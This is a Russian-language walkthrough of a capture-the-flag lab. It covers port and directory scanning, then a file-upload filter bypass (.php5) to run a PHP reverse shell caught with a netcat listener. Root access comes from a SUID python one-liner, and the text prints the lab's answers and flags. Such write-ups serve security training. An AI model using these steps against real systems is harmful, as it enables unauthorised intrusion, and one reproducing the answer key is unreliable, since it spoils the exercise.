## Recon

Смотрим открытые порты у цели: 
```bash
$ nmap -sC -sV -oN def_skan target

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
```

Видим что открыто 2 порта: порт 22 для ssh и порт 80 для HTTP. На порту 80 запущен веб-сервер Apache 2.4.29

Запускаем `gobuster` для  просмотра директорий

```bash 
$ gobuster dir -u http://target/ -t 50 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 302] [--> http://target/uploads/]
/js                   (Status: 301) [Size: 297] [--> http://target/js/]
/panel                (Status: 301) [Size: 300] [--> http://target/panel/]
/css                  (Status: 301) [Size: 298] [--> http://target/css/]
/server-status        (Status: 403) [Size: 271]
```

Нашли скрытую директорию `/panel`. Зайдя туда, мы видим, что на сайт можно загрузить файл. Также в `gobuster` можно увидеть директорию `/upload`, там мы можем увидеть загруженные нами файлы.


**Сколько портов открыто?:** 2

**Какая версия Apache?:** 2.4.29

**Что запущено на порту 22?:** ssh

**Какую скрытую директорию вы нашли?:** /panel
## Getting a shell

**Search for "file upload bypass" and "PHP reverse shell".**

Для получения доступа к терминалу мы будем использовать обратную оболочку. Заходим на сайт https://www.revshells.com/ и скачивае оттуда скрипт, меняем расширение файла на ".php5", потому что сервер не пропускает фалы с расширением ".php".

Запускаем `netcat`

`$ nc -lnvp 8888`

Загружаем файл на сервер и с помощью директории "/uploads" запускаем его.
Получили доступ к терминалу.

Ищем файл `user.txt`:

`$ find | grep user.txt`

Файл находится в директории: `/var/www`

Читаем:
```bash
$ cat /var/www/user.txt

THM{y0u_g0t_a_sh3ll}
```

**Вот и флаг:** THM{y0u_g0t_a_sh3ll}

## Privilege escalation

Ищем файлы с SUID:

```bash
$ find / -type f -perm -04000 -ls 2>/dev/null
```

Нашли: `/usr/bin/python`

```bash
$ cd /usr/bin

$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

whoami
root

cd /root
cat root.txt

THM{pr1v1l3g3_3sc4l4t10n}
```

**Флаг найден:** THM{pr1v1l3g3_3sc4l4t10n}